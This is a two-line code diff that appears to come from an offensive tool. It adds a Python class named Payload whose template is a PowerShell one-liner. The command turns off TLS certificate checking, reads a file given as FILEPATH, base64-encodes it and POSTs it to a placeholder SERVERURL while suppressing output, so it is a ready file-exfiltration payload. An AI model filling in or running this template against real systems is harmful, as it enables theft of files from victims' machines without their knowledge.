@@ -1,0 +1,2 @@
+class Payload:
+    template = '[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; Invoke-WebRequest -Uri SERVERURL -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("FILEPATH"))) | Out-Null'
